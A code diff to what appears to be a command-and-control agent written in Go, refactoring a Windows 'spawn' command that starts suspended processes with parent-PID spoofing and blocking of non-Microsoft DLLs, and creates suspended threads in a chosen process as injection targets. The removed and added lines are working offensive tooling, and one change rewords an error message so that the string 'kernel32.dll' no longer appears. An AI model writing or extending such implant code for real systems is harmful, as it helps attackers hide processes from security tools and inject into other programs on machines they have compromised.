@@ -113,7 +113,7 @@ func (c *SpawnCommand) Description() string {
 func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
 	ensureInjectionAPIs()
 	if runtime.GOOS != "windows" {
-		return errorResult("Error: This command is only supported on Windows")
+		return errorResult("This command is only supported on Windows")
 	}
 
 	params, parseErr := unmarshalParams[SpawnParams](task)
@@ -129,7 +129,7 @@ func (c *SpawnCommand) Execute(task structs.Task) structs.CommandResult {
 	case "thread":
 		return spawnSuspendedThread(params.PID)
 	default:
-		return errorf("Error: Unknown mode '%s'. Use 'process' or 'thread'", params.Mode)
+		return errorf("Unknown mode '%s'. Use 'process' or 'thread'", params.Mode)
 	}
 }
 
@@ -156,101 +156,31 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 	var processInfo PROCESS_INFORMATION
 
 	if useExtended {
-		// Count how many attributes we need
-		attrCount := 0
-		if ppid > 0 {
-			attrCount++
+		attrList, parentHandle, cleanup, attrErr := initProcAttrList(ppid, blockDLLs)
+		if attrErr != nil {
+			return errorResult(output + fmt.Sprintf("Error: %v", attrErr))
 		}
-		if blockDLLs {
-			attrCount++
-		}
-
-		// Determine attribute list size
-		var attrListSize uintptr
-		procInitializeProcThreadAttributeList.Call(
-			0,                                      // lpAttributeList (NULL for size query)
-			uintptr(attrCount),                     // dwAttributeCount
-			0,                                      // dwFlags (reserved)
-			uintptr(unsafe.Pointer(&attrListSize)), // lpSize
-		)
-
-		// Allocate and initialize the attribute list
-		attrListBuf := make([]byte, attrListSize)
-		attrList := (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(&attrListBuf[0]))
-
-		ret, _, err := procInitializeProcThreadAttributeList.Call(
-			uintptr(unsafe.Pointer(attrList)),
-			uintptr(attrCount),
-			0,
-			uintptr(unsafe.Pointer(&attrListSize)),
-		)
-		if ret == 0 {
-			return errorResult(output + fmt.Sprintf("Error: InitializeProcThreadAttributeList failed: %v", err))
-		}
-		defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(attrList)))
-
-		// PPID spoofing: open parent process and set attribute
-		var parentHandle windows.Handle
-		if ppid > 0 {
-			output += fmt.Sprintf("[*] PPID spoofing: parent PID %d\n", ppid)
-
-			hParent, errOpen := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(ppid))
-			if errOpen != nil {
-				return errorResult(output + fmt.Sprintf("Error: OpenProcess on PPID %d failed: %v", ppid, errOpen))
-			}
-			parentHandle = hParent
+		defer cleanup()
+		if parentHandle != 0 {
 			defer windows.CloseHandle(parentHandle)
-
-			ret, _, err = procUpdateProcThreadAttribute.Call(
-				uintptr(unsafe.Pointer(attrList)),
-				0, // dwFlags
-				uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
-				uintptr(unsafe.Pointer(&parentHandle)),
-				unsafe.Sizeof(parentHandle),
-				0, // lpPreviousValue
-				0, // lpReturnSize
-			)
-			if ret == 0 {
-				return errorResult(output + fmt.Sprintf("Error: UpdateProcThreadAttribute (PPID) failed: %v", err))
-			}
-			output += "[+] PPID attribute set\n"
+			output += fmt.Sprintf("[*] PPID spoofing: parent PID %d\n[+] PPID attribute set\n", ppid)
 		}
-
-		// Block non-Microsoft DLLs
 		if blockDLLs {
-			output += "[*] Blocking non-Microsoft DLLs\n"
-			mitigationPolicy := uint64(PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
-
-			ret, _, err = procUpdateProcThreadAttribute.Call(
-				uintptr(unsafe.Pointer(attrList)),
-				0,
-				uintptr(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
-				uintptr(unsafe.Pointer(&mitigationPolicy)),
-				unsafe.Sizeof(mitigationPolicy),
-				0,
-				0,
-			)
-			if ret == 0 {
-				return errorResult(output + fmt.Sprintf("Error: UpdateProcThreadAttribute (BlockDLLs) failed: %v", err))
-			}
-			output += "[+] DLL blocking policy set\n"
+			output += "[*] Blocking non-Microsoft DLLs\n[+] DLL blocking policy set\n"
 		}
 
-		// Create process with extended startup info
 		creationFlags |= EXTENDED_STARTUPINFO_PRESENT
 		var startupInfoEx STARTUPINFOEX
 		startupInfoEx.StartupInfo.Cb = uint32(unsafe.Sizeof(startupInfoEx))
 		startupInfoEx.AttributeList = attrList
 
-		ret, _, err = procCreateProcessW.Call(
+		ret, _, err := procCreateProcessW.Call(
 			0,
 			uintptr(unsafe.Pointer(commandLine)),
-			0,
-			0,
+			0, 0,
 			0, // bInheritHandles must be FALSE for PPID spoofing
 			uintptr(creationFlags),
-			0,
-			0,
+			0, 0,
 			uintptr(unsafe.Pointer(&startupInfoEx)),
 			uintptr(unsafe.Pointer(&processInfo)),
 		)
@@ -326,7 +256,7 @@ func spawnSuspendedThread(pid int) structs.CommandResult {
 
 	if hKernel32 == 0 {
 		windows.CloseHandle(windows.Handle(hProcess))
-		return errorResult(output + "Error: Failed to get kernel32.dll handle")
+		return errorResult(output + "Error: Failed to get system library handle")
 	}
 
 	sleepProc, _ := syscall.BytePtrFromString("Sleep")
